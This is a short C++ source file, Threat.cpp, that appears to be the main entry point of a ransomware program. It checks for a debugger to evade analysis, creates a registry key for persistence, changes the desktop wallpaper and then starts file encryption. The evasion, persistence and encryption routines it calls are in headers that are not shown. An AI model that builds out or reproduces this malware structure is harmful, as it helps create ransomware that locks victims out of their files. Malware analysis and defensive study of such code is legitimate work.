// Threat.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "Crypt.h"
#include "Evasion.h"
#include "Persistence.h"
#include "Utils.h"
#include <iostream>

int main(void) {
    Evasion evasion;

    if (evasion.isBeingDebugging()) {
        return 0xdeadbeef;
    }

    Persistence persistence;
    persistence.registryKeyCreation();

    Utils utils;
    utils.changeWallpaper();

    Crypt crypt;
    crypt.startCrypt();

    return EXIT_SUCCESS;
}
